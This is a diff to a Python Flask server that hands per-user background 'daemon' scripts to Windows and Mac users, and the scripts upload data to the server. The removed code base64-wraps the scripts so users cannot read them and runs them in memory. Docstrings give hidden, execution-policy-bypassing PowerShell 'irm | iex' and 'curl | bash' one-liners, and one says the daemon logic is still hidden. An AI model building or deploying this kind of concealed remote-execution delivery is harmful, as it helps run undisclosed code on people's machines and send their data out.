@@ -122,33 +122,15 @@ def get_upload_url():
     return f"{request.scheme}://{request.host}/upload"
 
 
-def obfuscate_script(script):
-    """Base64 encode the script so users can't read it.
-
-    Even if someone runs 'irm yourserver.com/s/CODE' without |iex,
-    they see a wall of Base64 characters, not readable code.
-    """
-    import base64
-    encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
-    # Return a tiny PowerShell stub that decodes and executes in memory
-    # The actual script never touches disk, never appears in readable form
-    wrapper = (
-        f"iex([System.Text.Encoding]::UTF8.GetString("
-        f"[Convert]::FromBase64String('{encoded}')))"
-    )
-    return wrapper
-
-
 @app.route("/s/<user_code>")
 def serve_windows_daemon(user_code):
-    """Serve obfuscated PowerShell daemon for Windows users.
+    """Serve PowerShell daemon for Windows users.
 
-    User runs:
-        powershell -W Hidden -EP Bypass -C "irm https://yourserver.com/s/USERCODE|iex"
-
-    What they see if they try to read it: a wall of Base64 gibberish.
-    What actually happens: decodes in memory, runs, never saved to disk.
+    The setup/keybind picker is plain text (needs interactive console).
+    The background daemon is Base64 encoded (hides server URLs and logic).
     """
+    import base64
+
     if not validate_user(user_code):
         logger.warning(f"Invalid user code attempted: {user_code[:10]}")
         abort(403)
@@ -167,21 +149,15 @@ def serve_windows_daemon(user_code):
     script = script.replace("{{SERVER_URL}}", upload_url)
     script = script.replace("{{USER_CODE}}", user_code)
 
-    # Obfuscate so user can't read the code
-    obfuscated = obfuscate_script(script)
-
-    return Response(obfuscated, mimetype="text/plain")
+    return Response(script, mimetype="text/plain")
 
 
 @app.route("/m/<user_code>")
 def serve_mac_daemon(user_code):
-    """Serve obfuscated bash daemon for Mac users.
+    """Serve bash/Swift daemon for Mac users.
 
     User runs:
         curl -s https://yourserver.com/m/USERCODE | bash
-
-    The script is Base64 encoded — user sees gibberish if they
-    curl without piping to bash.
     """
     if not validate_user(user_code):
         logger.warning(f"Invalid user code attempted: {user_code[:10]}")
@@ -201,12 +177,7 @@ def serve_mac_daemon(user_code):
     script = script.replace("{{SERVER_URL}}", upload_url)
     script = script.replace("{{USER_CODE}}", user_code)
 
-    # Obfuscate: wrap in base64 decode + eval for bash
-    import base64
-    encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
-    wrapper = f'eval "$(echo {encoded} | base64 -d)"'
-
-    return Response(wrapper, mimetype="text/plain")
+    return Response(script, mimetype="text/plain")
 
 
 # ==============================================================
